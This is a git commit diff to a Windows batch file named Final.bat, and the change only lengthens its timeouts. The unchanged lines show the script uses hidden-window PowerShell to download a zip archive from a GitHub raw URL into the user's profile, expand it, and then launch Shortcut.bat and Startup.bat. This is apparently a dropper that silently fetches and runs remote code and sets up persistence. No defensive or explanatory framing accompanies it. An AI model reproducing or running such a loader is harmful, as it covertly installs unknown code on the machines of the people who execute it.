30dbde02ce4fb73b11f84b65c8f740ae833e2b1b
peasiodjoaskdsa <140851719+peasiodjoaskdsa@users.noreply.github.com>
2023-12-10 12:48:15 +0100

    Update Final.bat

--- Final.bat
+++ Final.bat
@@ -1,8 +1,8 @@
 @echo off
 PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
-timeout /t 40 /nobreak
+timeout /t 120 /nobreak
 PowerShell.exe -NoProfile -WindowStyle hidden -Command "cd '%USERPROFILE'; Expand-Archive -Path 'ms\ms.zip' -DestinationPath 'ms\ms' -Force"
-timeout /t 20/nobreak
+timeout /t 40/nobreak
 start "" Shortcut.bat
 timeout /t 10/nobreak
 start "" Startup.bat
